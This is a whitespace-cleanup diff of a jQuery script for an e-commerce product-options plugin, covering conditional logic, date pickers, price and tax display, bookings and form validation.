@@ -71,7 +71,7 @@
                     matching.push( variation );
                 }
             }
-        }        
+        }
 
         return matching;
     };
@@ -97,7 +97,7 @@
     if (!$().tclightbox) {
         $.fn.tclightbox = function() {
             var elements = this;
-            
+
             if (elements.length==0){
                 return;
             }
@@ -111,22 +111,22 @@
                     _label = $this.closest("label"),
                     _input = _label.closest(".tmcp-field-wrap").find(".tm-epo-field[id='"+_label.attr("for") +"']");
                     _imgsrc= _input.attr("data-imagel") || _input.attr("data-imagep") || _input.attr("data-image") || _imgsrc;
-                
+
                 if (!_imgsrc){
                     return;
                 }
-                
+
                 $this.addClass("tcinit").before( $.fn.tm_template(template_engine.tc_lightbox,{}) );
                 var tclightboxwrap=$this.prev();
                 tclightboxwrap.prepend($this);
                 var _img_button = tclightboxwrap.find('.tc-lightbox-button');
-                
+
                 _img_button.addClass('tcinit').on("click.tclightbox",function(){
                     if ($('.tc-closing.tc-lightbox').length>0){
                         return;
                     }
                     var o = $.tm_getPageSize(),
-                        _img = $('<img>').addClass('tc-lightbox-img').attr('src',_imgsrc).css('maxHeight',o[3]+'px'),                    
+                        _img = $('<img>').addClass('tc-lightbox-img').attr('src',_imgsrc).css('maxHeight',o[3]+'px'),
                     temp_floatbox = $("body").tm_floatbox({
                         "fps": 1,
                         "ismodal": false,
@@ -143,7 +143,7 @@
                     });
                     $('.tc-lightbox-img, .tc-lightbox-button-close').on('click',function(){
                         temp_floatbox.cancelfunc();
-                    });                
+                    });
                 });
 
             });
@@ -158,7 +158,7 @@
     if (!$().tmsectionpoplink) {
         $.fn.tmsectionpoplink = function() {
             var elements = this;
-            
+
             if (elements.length==0){
                 return;
             }
@@ -178,7 +178,7 @@
                 var cancelfunc=function(){
                     var pop=$('#tm-section-pop-up');
                     pop.parents().removeClass('noanimated');
-                    
+
                     _ovl.unbind().remove();
                     pop.after(section);
                     pop.remove();
@@ -188,41 +188,41 @@
                 }
 
                 $this.on("click.tmsectionpoplink",function(e){
-                    
+
                     e.preventDefault();
                     clicked=false;
                     _ovl.appendTo("body").click(cancelfunc);
-                    
+
                     section.before($.fn.tm_template(template_engine.tc_section_pop_link,{'title':title,'close':tm_epo_js.i18n_close}));
                     var pop=$('#tm-section-pop-up');
                     pop.find('.float_editbox').prepend(section);
 
                     section.find('.tm-section-link').hide();
                     section.find('.tm-section-pop').show();
-                    
+
                     pop.parents().addClass('noanimated');
-                    
+
                     pop.find(".details_cancel").click(function() {
                         if (clicked){
                             return;
                         }
                         clicked=true;
-                        cancelfunc();                        
+                        cancelfunc();
                     });
                     _window.trigger("tmlazy");
                 });
-                
+
             });
         };
     }// End Section popup
 
     // Start Conditional logic
     if (!$().cpfdependson) {
-            
+
         $.fn.cpfdependson = function(fields, toggle, what,refresh) {
             var elements    = this,
                 matches     = 0;
-            
+
             if (elements.length==0 || !typeof fields =="object"){
                 return;
             }
@@ -233,7 +233,7 @@
             if (!what){
                 what="all";
             }
-            
+
             $.each(fields,function(i,field){
                 if (!typeof fields == "object"){
                     return true;
@@ -243,7 +243,7 @@
                     get_element.each(function(i,element){
                         if (element && (!$(element).data('tmhaslogicevents') || refresh) ){;
                             if ($(element).is(".tm-epo-variation-element")){
-                                
+
                                 add_variation_event('found_variation.tmlogic', false, function(event, variation) {
                                     run_cpfdependson();
                                     _window.trigger('tm-do-epo-update');
@@ -260,7 +260,7 @@
                                 }
                                 $(element).off(_events).on(_events,function(e){
                                     run_cpfdependson();
-                                });                        
+                                });
                             }
                             $(element).data('tmhaslogicevents',1);
                         }
@@ -270,7 +270,7 @@
                 }
 
             });
-            
+
             elements.each(function(i,el){
                 var $this   = $(this),
                     show    = false;
@@ -278,7 +278,7 @@
                     .data("toggle",toggle)
                     .data("what",what)
                     .data("fields",fields);
-                
+
                 switch (toggle){
                     case "show":
                         show=false;
@@ -291,7 +291,7 @@
                     $this.show();
                 }else{
                     $this.hide();
-                }                
+                }
                 $this.data('isactive',show);
             });
 
@@ -305,7 +305,7 @@
             run_cpfdependson();
         }
     }
-    
+
     $.tcepo = {
         temp_floatbox : false,
 
@@ -321,7 +321,7 @@
         }else{
             hide_element=$(field);
         }
-        
+
         if ($(hide_element).data('isactive')!==false && $(hide_element).closest('.cpf-section').data('isactive')!==false){
             $(field).prop('disabled',false);
             return true;
@@ -338,21 +338,21 @@
         }
         return false;
     }
-    
+
     function run_cpfdependson(obj){
         if (!$(obj).length){
             obj="body";
         }
         var iscpfdependson = $(obj).find('.iscpfdependson');
         iscpfdependson.each(function(i,elements){
-            $(elements).each(function(j,el){                
+            $(elements).each(function(j,el){
                 tm_check_rules($(el));
-            });            
+            });
         });
         iscpfdependson.each(function(i,elements){
-            $(elements).each(function(j,el){                
-                tm_check_rules($(el),'cpflogic');                
-            });            
+            $(elements).each(function(j,el){
+                tm_check_rules($(el),'cpflogic');
+            });
         });
         iscpfdependson.each(function(i,elements){
             $(elements).each(function(j,o){
@@ -361,11 +361,11 @@
                     o=o.find(".cpf_hide_element");
                 }
                 o.each(function(theindex,theelement){
-                         
+
                     var f=field_is_active($(theelement).find('.tm-epo-field'));
-                           
-                });                    
-            });            
+
+                });
+            });
         });
         if ($().selectric){
             $('.tm-extra-product-options select').selectric('refresh');
@@ -464,14 +464,14 @@
                                 all_checked = all_checked && checkbox_checked.length>0
                             }else if (operator=='isempty'){
                                 all_checked = all_checked && checkbox_checked.length==0
-                            } 
+                            }
                             break;
                         case "cpf-type-select" :
                             var select = element.find("select.tm-epo-field.tmcp-select"),
                                 options = element.find("select.tm-epo-field.tmcp-select").children('option'),
                                 selected = element.find("select.tm-epo-field.tmcp-select").children('option:selected');
                             var eq=options.index(selected);
-                                
+
                             if (options.eq(0).val()==="" && options.eq(0).attr('data-rulestype')===""){
                                 eq=eq-1;
                             }
@@ -481,7 +481,7 @@
                             builder_addition=builder_addition.length;
                             val=element.find("select.tm-epo-field.tmcp-select").val();
                             if(val){
-                                val=val.slice(0,-builder_addition); 
+                                val=val.slice(0,-builder_addition);
                             }
 
                             break;
@@ -502,10 +502,10 @@
                 }else{
                     all_checked = all_checked && false;
                 }
-            }          
+            }
         });
         return all_checked;
-    
+
     }
 
     function tm_check_field_match(f){
@@ -530,7 +530,7 @@
                     return v;
                 }
             });
-                
+
         if (_class.length>0){
             _class=_class[0];
             switch (_class){
@@ -545,10 +545,10 @@
                         var eq=radio.index(radio_checked),
                             builder_addition="_"+eq;
 
-                        builder_addition=builder_addition.length;                        
+                        builder_addition=builder_addition.length;
                         val=element.find("input.tm-epo-field.tmcp-radio:checked").val();
                         if(val){
-                            val=val.slice(0,-builder_addition); 
+                            val=val.slice(0,-builder_addition);
                         }
                     }else if (operator=='isnotempty'){
                         return radio_checked.length>0
@@ -572,7 +572,7 @@
                             builder_addition=builder_addition.length;
                             val=$(el).val();
                             if(val){
-                                val=val.slice(0,-builder_addition); 
+                                val=val.slice(0,-builder_addition);
                             }
                             if (tm_check_match(val,value,operator)){
                                 ret=true;
@@ -583,14 +583,14 @@
                         return checkbox_checked.length>0
                     }else if (operator=='isempty'){
                         return checkbox_checked.length==0
-                    } 
+                    }
                     break;
                 case "cpf-type-select" :
                     var select = element.find("select.tm-epo-field.tmcp-select"),
                         options = element.find("select.tm-epo-field.tmcp-select").children('option'),
                         selected = element.find("select.tm-epo-field.tmcp-select").children('option:selected');
                     var eq=options.index(selected);
-                        
+
                     if (options.eq(0).val()==="" && options.eq(0).attr('data-rulestype')===""){
                         eq=eq-1;
                     }
@@ -600,7 +600,7 @@
                     builder_addition=builder_addition.length;
                     val=element.find("select.tm-epo-field.tmcp-select").val();
                     if(val){
-                        val=val.slice(0,-builder_addition); 
+                        val=val.slice(0,-builder_addition);
                     }
 
                     break;
@@ -628,7 +628,7 @@
         }
 
         return false;
-                    
+
     }
 
     function tm_variation_check_match(element, val2, operator){
@@ -642,7 +642,7 @@
             variation_id_selector='input.variation_id';
         }
         val1=variations_form.find( variation_id_selector ).val();
-        
+
         switch(operator){
         case "is" :
             return (val1!="" && val1 == val2);
@@ -676,10 +676,10 @@
         }
         return false;
     }
-    
+
     function tm_check_match(val1, val2, operator){
         if (val1!=null && val2!=null){
-            
+
             val1=encodeURIComponent(val1);
 
             if ($.qtranxj_split){
@@ -734,7 +734,7 @@
         if ($(element).is('.cpf-section')){
             return element.find(".tm-epo-field");
         }
-        
+
         var _class=element.attr("class").split(' ')
             .map(function(cls) {
                 if (cls.indexOf("cpf-type-", 0) !== -1) {
@@ -749,7 +749,7 @@
 
         if (_class.length>0){
             _class=_class[0];
-            
+
             switch (_class){
                 case "cpf-type-radio" :
                     return element.find(".tm-epo-field.tmcp-radio");
@@ -787,25 +787,25 @@
 
     /* Following loops are required for the logic to work on composite products that have custom variations */
     function cpf_section_logic(obj){
-        
+
         var root_element=$(obj),
             all_sections=root_element.find(".cpf-section"),
             search_obj;
-        
+
         if (root_element.is('.cpf-section')){
             search_obj = false;
         }else{
             search_obj = all_sections;
         }
-        
-        root_element.each(function(j,obj_el){            
+
+        root_element.each(function(j,obj_el){
             var cpf_section;
             if ($(obj_el).is('.cpf-section')){
                 cpf_section = $(obj_el);
             }else{
                 cpf_section = $(obj_el).find(".cpf-section");
             }
-            
+
             cpf_section.each(function(index,el){
                 var sect = $(el),
                     id = sect.data("uniqid"),
@@ -823,7 +823,7 @@
                                 value       = rule.value,
                                 obj_section,
                                 obj_element;
-                            
+
                             if (search_obj){
                                 obj_section = search_obj.filter('[data-uniqid="'+section+'"]');
                                 if (element!=section){
@@ -831,20 +831,20 @@
                                 }else{
                                     obj_element = obj_section;
                                 }
-                                
+
                             }else{
                                 if (element!=section){
                                     obj_element = root_element.find(".cpf_hide_element").eq(element);
                                 }else{
                                     obj_element = obj_section;
-                                }                            
+                                }
                             }
 
                             fields.push({
                                 "element":obj_element,
                                 "operator":operator,
                                 "value":value
-                            });                            
+                            });
                         }
                     });
                     if (!sect.data('iscpfdependson')){
@@ -858,15 +858,15 @@
             });
 
         });
-        
+
     }
 
     function cpf_element_logic(obj){
 
-        var root_element=$(obj), 
+        var root_element=$(obj),
             all_sections=root_element.find(".cpf-section"),
             search_obj;
-        
+
         if (root_element.is('.cpf-section')){
             search_obj = false;
         }else{
@@ -896,7 +896,7 @@
                                 obj_element = obj_section.find(".cpf_hide_element").eq(element);
                             }else{
                                 obj_element = obj_section;
-                            }                        
+                            }
                         }else{
                             if (element!=section){
                                 obj_element = root_element.find(".cpf_hide_element").eq(element);
@@ -920,9 +920,9 @@
                 }
             }
         });
-        
+
     }// End Conditional logic
-    
+
     // Taxes setup
     function get_price_including_tax(price, _cart) {
         if (isNaN(parseFloat(price))){
@@ -1000,12 +1000,12 @@
                     if (prices_include_tax=="1"){
                         value = parseFloat(value)/(1+(tax_rate/100));
                     }else{
-                        
-                    }                    
+
+                    }
 
                 } else {// Display with taxes
                     if (prices_include_tax=="1"){
-                        
+
                     }else{
                         value = parseFloat(value)*(1+(tax_rate/100));
                     }
@@ -1032,12 +1032,12 @@
                     if (prices_include_tax=="1"){
                         //value = parseFloat(value)/(1+(tax_rate/100));
                     }else{
-                        
-                    }                    
+
+                    }
 
                 } else {// Display with taxes
                     if (prices_include_tax=="1"){
-                        
+
                     }else{
                         value = parseFloat(value)/(1+(tax_rate/100));
                     }
@@ -1089,7 +1089,7 @@
                     $obj.html( $.fn.tm_template(template_engine.sale_price,{price:priceobj}) );
                 }else{
                     $obj.html( $.fn.tm_template(template_engine.price,{price:priceobj}) );
-                }                
+                }
                 $ba_amount.removeClass('tm-hidden');
             }
         }else{
@@ -1097,13 +1097,13 @@
             $ba_amount.addClass('tm-hidden');
         }
     }
-        
+
     function add_variation_event(name,selector,func){
         late_variation_event[late_variation_event.length] = {
             "name" : name,
             "selector" : selector,
             "func" : func
-        };        
+        };
     }
 
     function get_variation_current_settings(form){
@@ -1142,7 +1142,7 @@
                     check_if_all_are_not_set[i]=false;
                 }
                 t.children('option').each(function(x,o){
-    
+
                     exists = false;
                     form.find('#'+id).children('option').each(function(){
                         if ($(this).attr("value") == $(o).attr("value")) {
@@ -1159,7 +1159,7 @@
                 });
 
             }else{
-                
+
                 t.each(function(x,o){
                     var o=$(o),
                         li=o.closest("li"),
@@ -1171,17 +1171,17 @@
                     }
                     var this_settings=get_variation_current_settings(form);
                     this_settings[ 'attribute_'+id ] = v;
-                    
+
                     var matching_variations = $.fn.tm_find_matching_variations( all_variations, this_settings );
                     var variation = matching_variations.shift();
-                    
+
                     var is_in_stock=(variation && ("is_in_stock" in variation) && variation.is_in_stock);
                     if (!variation || !is_in_stock){
                         o.attr("disabled","disabled").addClass("tm-disabled");
-                        
+
                         input.attr("disabled","disabled");
                         input.attr("data-tm-disabled","disabled");
-                        
+
                         li.addClass("tm-attribute-disabled").fadeTo( "fast" , 0.5);
                         if(!is_in_stock){
                             li.find("label").off();
@@ -1223,7 +1223,7 @@
                         li.removeClass("tm-attribute-disabled").stop().css("opacity", "");
                         input.removeAttr("disabled");
                         input.removeAttr("data-tm-disabled");
-                    });                    
+                    });
                 }
             });
         }
@@ -1291,7 +1291,7 @@
         if (stock.length){
             form.find('.tm-stock').remove();
             if (tm_fix_stock(form, stock.prop('outerHTML'))){
-                stock.remove();    
+                stock.remove();
             }
         }else{
             form.find('.tm-stock').remove();
@@ -1299,7 +1299,7 @@
     }
 
     function tm_init_epo(main_product,is_quickview,product_id,epo_id){
-        
+
         main_product=$(main_product);
 
         // Range picker setup
@@ -1366,15 +1366,15 @@
                     direction:tm_epo_js.text_direction,
                     start: $start,
                     step: $step,
-                    connect: 'lower',            
+                    connect: 'lower',
                     // Configure tapping, or make the selected range dragable.
-                    behaviour: 'tap',            
+                    behaviour: 'tap',
                     // Full number format support.
                     format: wNumb({
                         mark: ".",
                         decimals: $decimals,
                         thousand: "",
-                    }),            
+                    }),
                     // Support for non-linear ranges by adding intervals.
                     range: {
                         'min': [$min],
@@ -1395,7 +1395,7 @@
                             thousand: local_thousand_separator,
                             precision: $decimals
                         }));
-                    }                    
+                    }
                     $tmfid.val(values[handle]);
                     if ($show_picker_value!=""){
                         $show_label.html(accounting.formatNumber(values[handle], {
@@ -1405,7 +1405,7 @@
                         }));
                     }
                 });
-                
+
                 if ($show_picker_value!="left" && $show_picker_value!="right"){
                     $tmh.attr('title',el.attr('data-start'));
                     $.tm_tooltip($tmh);
@@ -1413,11 +1413,11 @@
                 if ($show_picker_value!=""){
                     $show_label.html($start);
                 }
-          
+
             });
-            
+
         }
-        
+
         // Date and time picker setup
         function tm_set_datepicker(obj){
             if (!$.tm_datepicker){
@@ -1429,7 +1429,7 @@
             var inputIds = $('input').map(function() {
                     return this.id;
                 }).get().join(' ');
-            
+
             obj.find( ".tm-epo-timepicker" ).each(function(i,el){
                 var $this               = $(el),
                     _mintime            = ($this.attr('data-min-time').trim()!=="")?$this.attr('data-min-time').trim():null,
@@ -1454,22 +1454,22 @@
                         .removeClass("tm-datepicker-normal tm-datepicker-top tm-datepicker-bottom")
                         .addClass(this.id+ ' tm-bsbb-all tm-ui-skin-'+date_theme+' tm-timepicker tm-datepicker tm-datepicker-'+date_theme_position+' tm-datepicker-'+date_theme_size)
                         .appendTo("body");
-                        
+
                         _document
                         .off('click','.tm-ui-dp-overlay')
                         .on('click','.tm-ui-dp-overlay',function(){$this.tm_timepicker("hide");});
                         $("body").addClass("tm-static");
                         $this.prop("readonly",true);
-                        
+
                         _window.trigger({
                             "type":"tm-timepicker-beforeShow",
                             "input":input,
                             "inst":inst
                         });
-                        
+
                     },
                     onClose: function(dateText, inst) {
-                        $("body").removeClass("tm-static");                    
+                        $("body").removeClass("tm-static");
                         $this.prop("readonly",false);
                         $this.trigger("change");
                     },
@@ -1568,10 +1568,10 @@
                             month = date.getMonth() + 1;
                             year =  date.getFullYear();
                             var string = $.tm_datepicker.formatDate(format, date);
-                            if (disabled_weekdays.indexOf(date.getDay().toString())!=-1 
-                                || disabled_dates.indexOf(string) != -1 
+                            if (disabled_weekdays.indexOf(date.getDay().toString())!=-1
+                                || disabled_dates.indexOf(string) != -1
                                 || (enabled_only_dates!="" && enabled_only_dates.indexOf(string) == -1)
-                            ){                        
+                            ){
                                 var ld=input.data('tm-last-date');
                                 if (input.data('tm-last-date')){
                                     ld=input.data('tm-last-date');
@@ -1606,22 +1606,22 @@
                         .removeClass("tm-datepicker-normal tm-datepicker-top tm-datepicker-bottom")
                         .addClass(this.id+ ' tm-bsbb-all tm-ui-skin-'+date_theme+' tm-datepicker tm-datepicker-'+date_theme_position+' tm-datepicker-'+date_theme_size)
                         .appendTo("body");
-                        
+
                         _document
                         .off('click','.tm-ui-dp-overlay')
                         .on('click','.tm-ui-dp-overlay',function(){$this.tm_datepicker("hide");});
                         $("body").addClass("tm-static");
                         $this.prop("readonly",true);
-                        
+
                         _window.trigger({
                             "type":"tm-datepicker-beforeShow",
                             "input":input,
                             "inst":inst
                         });
-                        
+
                     },
                     onClose: function(dateText, inst) {
-                        $("body").removeClass("tm-static");                    
+                        $("body").removeClass("tm-static");
                         $this.prop("readonly",false);
                         $this.trigger("change");
                     },
@@ -1631,7 +1631,7 @@
                             var string = $.tm_datepicker.formatDate(format, date);
                             return [ enabled_only_dates.indexOf(string) != -1 ,""];
                         }else{
-                            
+
                             if (disabled_weekdays.indexOf(day.toString())!=-1){
                                 return [false,""];
                             }
@@ -1647,7 +1647,7 @@
                 });
                 $('#ui-tm-datepicker-div').hide();
             });
-            
+
             function _validate_date_with_options(date,input){
                 input=$(input);
 
@@ -1665,7 +1665,7 @@
                     var string = $.tm_datepicker.formatDate(format, date);
                     return enabled_only_dates.indexOf(string) != -1 ;
                 }else{
-                            
+
                     if (disabled_weekdays.indexOf(day.toString())!=-1){
                         return false;
                     }
@@ -1710,11 +1710,11 @@
                     year        = year_select.val(),
                     dateFormat  = $.tm_datepicker.formatDate(format, new Date( year, month-1, day));
 
-                if ( 
-                    ( year!=='' && month!=='' && day!=='' ) ||  
-                    ( (year!=='' && month!=='') && day==='' ) || 
-                    ( (day!=='' && year!=='')  && month==='' ) || 
-                    ( (day!=='' && month!=='') && year==='' ) 
+                if (
+                    ( year!=='' && month!=='' && day!=='' ) ||
+                    ( (year!=='' && month!=='') && day==='' ) ||
+                    ( (day!=='' && year!=='')  && month==='' ) ||
+                    ( (day!=='' && month!=='') && year==='' )
                 ){
                     var _select = $(this);
                     _select.find("option").each(function(){
@@ -1740,25 +1740,25 @@
                         }
 
                         if (val!=''){
-                            
+
                             try {
 
-                                var d = $.tm_datepicker.parseDate( "yy-mm-dd", date_string );                            
+                                var d = $.tm_datepicker.parseDate( "yy-mm-dd", date_string );
                                 if(d){
                                     if(_validate_date_with_options(d,input)){
                                         $this.prop("disabled",false);
                                     }else{
-                                        $this.prop("disabled",true);    
-                                    }                                    
+                                        $this.prop("disabled",true);
+                                    }
                                 }
                             } catch(e) {
 
                               $this.prop("disabled",true);
 
-                            }                            
-                            
+                            }
+
                         }
-                        
+
                     });
                 }else{
                     day_select.find("option").prop("disabled",false);
@@ -1766,9 +1766,9 @@
                     year_select.find("option").prop("disabled",false);
                 }
 
-            });       
+            });
 
-            $(window).on("resizestart",function() {            
+            $(window).on("resizestart",function() {
                 var field = $(document.activeElement);
                 if (field.is('.hasDatepicker')) {
                     field.data("resizestarted",true);
@@ -1776,22 +1776,22 @@
                         field.data("resizewidth",true);
                         return;
                     }
-                    field.tm_datepicker('hide');                
+                    field.tm_datepicker('hide');
                 }
             });
-            $(window).on("resizestop",function() {            
+            $(window).on("resizestop",function() {
                 var field = $(document.activeElement);
                 if (field.is('.hasDatepicker') && field.data("resizestarted")) {
                     if (field.data("resizewidth")){
                         field.tm_datepicker('hide');
                     }
-                    field.tm_datepicker('show');                
+                    field.tm_datepicker('show');
                 }
                 field.data("resizestarted",false);
                 field.data("resizewidth",false);
             });
 
-        };        
+        };
 
         // URL replacement setup
         function tm_set_url_fields(){
@@ -1799,7 +1799,7 @@
                 var data_url=$(this).attr("data-url");
                 if (data_url){
                     if (window.location!=data_url){
-                        e.preventDefault();                
+                        e.preventDefault();
                         window.location=data_url;
                     }
                 }
@@ -1809,7 +1809,7 @@
                     data_url=selected.attr("data-url");
                 if (data_url){
                     if (window.location!=data_url){
-                        e.preventDefault();                
+                        e.preventDefault();
                         window.location=data_url;
                     }
                 }
@@ -1829,7 +1829,7 @@
                             field_name=field.first().attr("name");
                         if (tmcpulwrap.is(".tm-extra-product-options-radio.tm-element-ul-radio")){
                             field_name=field.last().attr("name");
-                        }    
+                        }
                         if (tmcpulwrap.is(".tm-extra-product-options-checkbox.tm-element-ul-checkbox")){
                             field.each(function(f,fname){
                                 if ("required" in has_rules){
@@ -1840,20 +1840,20 @@
                                                 return true;
                                             }else{
                                                 return false;
-                                            }                                            
+                                            }
                                         }
                                         return len <= 0;
                                     };
                                 }
                                 validation_rules[$(fname).attr("name")]=has_rules;
                             });
-                            
+
                         }else{
                             validation_rules[field_name]=has_rules;
-                        }                        
+                        }
                     }
                 });
-                
+
                 form.removeData('tc_validator');
                 var validator = form.tc_validate({
                         ignore          : "input.tm-qty:hidden[type='number'],input.input-text.qty,.ignore,.variations select,.tm-extra-product-options-variations input,.tm-extra-product-options-variations select",
@@ -1873,8 +1873,8 @@
                             setTimeout(function() {
                                 main_product.find('.single_add_to_cart_button').removeAttr('disabled').removeClass('fpd-disabled');
                                 if ($.tcepo.temp_floatbox && "object"==typeof $.tcepo.temp_floatbox){
-                                    $.tcepo.temp_floatbox.cancelfunc();    
-                                }                                
+                                    $.tcepo.temp_floatbox.cancelfunc();
+                                }
                             }, 100 );
                             if (validator.errorList && validator.errorList[0] && validator.errorList[0].element){
                                 goto_error_item($(validator.errorList[0].element));
@@ -1943,7 +1943,7 @@
             if (!is_quickview && tm_epo_js.floating_totals_box && tm_epo_js.floating_totals_box!='disable'){
 
                 if ( main_cart && this_epo_totals_container.length ) {
-                    
+
                     var $tm_floating_box    = $('<div class="tm-floating-box '+tm_epo_js.floating_totals_box+'"></div>'),
                         is_nks              = false,
                         fb,
@@ -1955,9 +1955,9 @@
                         $tm_floating_box.removeClass('top left right bottom').appendTo(nks_selector).show();
                     }else{
                         if (alt_selector.length>0){
-                            $tm_floating_box.removeClass('top left right bottom').appendTo(alt_selector).hide();  
+                            $tm_floating_box.removeClass('top left right bottom').appendTo(alt_selector).hide();
                         }else{
-                            $tm_floating_box.appendTo("body").hide();    
+                            $tm_floating_box.appendTo("body").hide();
                         }
                     }
                     if (nks_selector.length>0 || alt_selector.length>0){
@@ -1971,7 +1971,7 @@
                                         $tm_floating_box.fadeIn();
                                     }else{
                                         $tm_floating_box.show();
-                                    } 
+                                    }
                                 }
                             }else{
                                 if (!$tm_floating_box.is(":hidden")){
@@ -1979,9 +1979,9 @@
                                         $tm_floating_box.fadeOut();
                                     }else{
                                         $tm_floating_box.hide();
-                                    } 
+                                    }
                                 }
-                            }                    
+                            }
                         }
 
                     var tm_update_epo_pop = function(){
@@ -1989,7 +1989,7 @@
                             tm_floating_box_data        = this_epo_totals_container.data('tm-floating-box-data'),
                             values_obj=[];
                         if (tm_floating_box_data && tm_floating_box_data.length){
-                            
+
                             $.each(tm_floating_box_data,function(i,row){
                                 if(row.title==''){
                                     row.title='&nbsp;';
@@ -2023,7 +2023,7 @@
                                 });
                             });
                         }
-                        
+
                         if ( ( tm_epo_totals_html && tm_epo_totals_html!='' ) || is_nks){
                             tm_update_epo_pop_scroll();
                         }else{
@@ -2045,16 +2045,16 @@
                         });
 
                         $tm_floating_box.html(fb);
-                        
+
                     }
                     tm_update_epo_pop();
-                    
-                    main_cart.on('tm-epo-after-update',  function() {  
+
+                    main_cart.on('tm-epo-after-update',  function() {
                         tm_update_epo_pop();
                     });
 
                     if (!is_nks){
-                        
+
                         tm_update_epo_pop_scroll();
 
                         $(window).on( 'scroll', function () {
@@ -2122,7 +2122,7 @@
                 });
                 // move totals before booking button
                 if (tm_epo_js.tm_epo_totals_box_placement=='woocommerce_before_add_to_cart_button'){
-                    $('.wc-bookings-booking-form-button').before(this_totals_container);    
+                    $('.wc-bookings-booking-form-button').before(this_totals_container);
                 }
 
                 this_epo_totals_container.data('tc_is_bookings',1);
@@ -2176,7 +2176,7 @@
                 // alter bookings change handler
                 if (originalevent!==false && found){
                     var bookingform = epo_trigger.closest('.wc-bookings-booking-form');
-                        
+
                     bookingform
                     .off('change', 'input, select', originalevent)
                     .on('change.tcbookings', 'input, select', function(event){
@@ -2184,7 +2184,7 @@
                             $form           = $(this).closest('form'),
                             required_fields = $form.find('input.required_for_calculation'),
                             filled          = true;
-                            
+
                         $.each( required_fields, function( index, field ) {
                             var value = $(field).val();
                             if ( ! value ) {
@@ -2200,12 +2200,12 @@
                             if (!form.tc_validate().form()){
                                 event.stopImmediatePropagation();
                                 //console.log('not validated');
-                                return;                                
+                                return;
                             }
                         }
-                        
+
                         event.stopImmediatePropagation();
-                            
+
                         var data = {
                             action: 'tc_epo_bookings_calculate_costs',
                             form:   $form.serialize(),
@@ -2222,8 +2222,8 @@
                                 $this.trigger('tc_bookings_change');
                             }else if (response && response.result=="ERROR" ){
                                 this_epo_totals_container.data('bookings_form_init',0);
-                                
-                                $form.find('.wc-bookings-booking-cost').show().html( response.html );                            
+
+                                $form.find('.wc-bookings-booking-cost').show().html( response.html );
 
                             }
                         },'json');
@@ -2243,7 +2243,7 @@
                     this_epo_container.find('.tm-epo-field').not('.tm-epo-counter')
                     .off('change.tcbookings')
                     .on('change.tcbookings',  function(pass) {
-                        
+
                         epo_trigger.trigger('change');
                         return;
 
@@ -2259,19 +2259,19 @@
                             if(epos.length==1){
                                 var form = originalOptions.data["form"].tmparseParams();
                                 form = $.extend(
-                                        form, 
+                                        form,
                                         epos.tm_aserializeObject()
                                     );
                                 originalOptions.data["form"] = $.param(form, false );
-                                options.data = $.param( 
+                                options.data = $.param(
                                     $.extend(
-                                        originalOptions.data, 
+                                        originalOptions.data,
                                         {}
                                     ), false );
-                            }  
-                        }                        
+                            }
+                        }
                     });
-                   
+
                 }
             }
         }
@@ -2280,11 +2280,11 @@
             if (!main_cart){
                  main_cart = get_main_cart(main_product,"form",product_id);
             }
-            
+
             var form                        = get_main_form(),
                 main_epo_inside_form_check  = form.find(epo_selector+".tm-cart-main").length,
                 main_totals_inside_form_check  = form.find(".tm-totals-form-main").length;;
-            
+
             if (main_epo_inside_form_check>0){
                 main_epo_inside_form=true;
             }
@@ -2336,7 +2336,7 @@
                 };
             }
         }
-        
+
         function tm_show_hide_add_to_cart_button(){
             //Hide cart button check
             if (has_epo && tm_epo_js.tm_epo_hide_add_cart_button=="yes"){
@@ -2401,7 +2401,7 @@
                         checked = checked + 1;
                     }
 
-                });             
+                });
                 if (checked>allowed){
                     if(prevent){
                         $this.prop("checked", "").trigger("change");
@@ -2447,7 +2447,7 @@
                     }else{
                         em.remove();
                     }
-                 }                 
+                 }
             });
             if(first_error_obj){
                 global_error_obj=first_error_obj;
@@ -2455,7 +2455,7 @@
             return checkall;
         }
 
-        function tm_check_exactlimit_cont(exactlimit_cont){        
+        function tm_check_exactlimit_cont(exactlimit_cont){
             form_submit_events[form_submit_events.length] = {
                 "trigger" : function(){
                     var check=tm_exactlimit_cont(exactlimit_cont);
@@ -2464,7 +2464,7 @@
                 "on_true" : function(){return true;},
                 "on_false" : function(){goto_error_item($(exactlimit_cont).find(".tm-epo-field").first());return true;}
             };
-            
+
         }
 
         function tm_minimumlimit_cont(minimumlimit_cont){
@@ -2502,16 +2502,16 @@
                     }else{
                         em.remove();
                     }
-                 }                 
+                 }
             });
             if(first_error_obj){
                 global_error_obj=first_error_obj;
             }
-            
+
             return checkall;
         }
 
-        function tm_check_minimumlimit_cont(minimumlimit_cont){        
+        function tm_check_minimumlimit_cont(minimumlimit_cont){
 
             form_submit_events[form_submit_events.length] = {
                 "trigger" : function(){
@@ -2521,7 +2521,7 @@
                 "on_true" : function(){return true;},
                 "on_false" : function(){goto_error_item();return true;}
             };
-            
+
         }
 
         function goto_error_item(item){
@@ -2530,7 +2530,7 @@
                 var elsection=el.closest('.cpf-section'),
                     elsectionlink=elsection.find('.tm-section-link'),
                     elcpf_hide_element=el.closest('.cpf_hide_element');
-                
+
                 if(elsection.find('.tm-toggle').length){
                     elsection.find('.tm-toggle').trigger('openwrap.tmtoggle');
                 }
@@ -2551,11 +2551,11 @@
                 else{
                     if (elcpf_hide_element.length>0){
                         $(window).tc_scrollTo(elcpf_hide_element,300);
-                    }                    
+                    }
                 }
                 if(!item){
-                    global_error_obj = false;    
-                }                
+                    global_error_obj = false;
+                }
             }
         }
 
@@ -2570,7 +2570,7 @@
 
                 if (is_subscription){
                     base.find('.tmperiod').remove();
-                    
+
                     var is_hidden=base.find('.amount').is(".hidden");
                     if (is_hidden){
                         is_hidden=" hidden";
@@ -2591,12 +2591,12 @@
                             current_variation = 0;
                         }
                         if(variations_subscription_period[current_variation]){
-                            subscription_period=variations_subscription_period[current_variation];    
+                            subscription_period=variations_subscription_period[current_variation];
                         }
                     }
 
                     base.find('.amount').after('<span class="tmperiod'+is_hidden+'"> / '+subscription_period+'</span>');
-                    
+
                     $(this).find('.tmperiod').remove();
                     $(this).find('.amount.options').after('<span class="tmperiod"> / '+subscription_period+'</span>');
                     $(this).find('.amount.final').after('<span class="tmperiod"> / '+subscription_period+'</span>');
@@ -2687,11 +2687,11 @@
                                     return false;
                                 break;
                             }
-                            
+
                         }
-                    });    
+                    });
                 }
-                
+
             }
 
             return price;
@@ -2750,11 +2750,11 @@
                                     return false;
                                 break;
                             }
-                            
+
                         }
-                    });    
+                    });
                 }
-                
+
             }
 
             return price;
@@ -2825,11 +2825,11 @@
                                     return false;
                                 break;
                             }
-                            
+
                         }
-                    });    
+                    });
                 }
-                
+
             }
             return price;
